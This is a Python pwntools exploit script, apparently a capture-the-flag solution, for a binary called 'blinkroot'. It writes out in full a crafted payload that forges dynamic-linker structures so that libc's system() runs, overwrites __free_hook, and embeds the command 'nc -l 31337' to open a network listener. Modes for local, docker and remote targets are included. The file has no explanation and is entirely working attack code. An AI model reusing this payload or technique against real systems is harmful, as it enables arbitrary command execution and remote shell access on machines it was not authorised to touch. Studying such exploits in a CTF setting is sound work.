from pwn import *
import sys
from time import time
import ctypes

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./blinkroot"
LIBC = "/tmp/libc.so.6"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def exploit(conn, elf, libc, local):
    payload = ""
    payload += p64(ctypes.c_uint64(0x600b40 - 0x600bc0).value)
    payload += p64(0x600b80)

    payload += "nc -l 31337".ljust(0x18, "\x00")
    payload += p64(0x600c00)
    payload += p64(0x600c40)
    payload += p64(0)

    payload += p64(5)
    payload += p64(0x600c10)
    payload += "system".ljust(8, "\x00")
    payload += p64(0)

    payload += p64(0) * 4

    payload += p64(6)
    payload += p64(0x600c50 - 0x30)

    payload += p32(0)
    payload += p32(0x312)
    payload += p64(libc.symbols['system'] - libc.symbols['__libc_start_main'])
    payload += p32(1)
    payload += p32(1)

    payload += p64(0)
    payload += p64(0)
    payload += p64(0x600c80)

    payload += p64(0x17)
    payload += p64(0x600c90 - 0x18)

    payload += p64(libc.symbols['__free_hook'] - libc.symbols['__libc_start_main'])
    payload += p64(0x200000007)
    payload += p64(0)

    conn.send(payload.ljust(0x400, "\x00"))
    conn.interactive()
    conn.close()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("", 1337)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
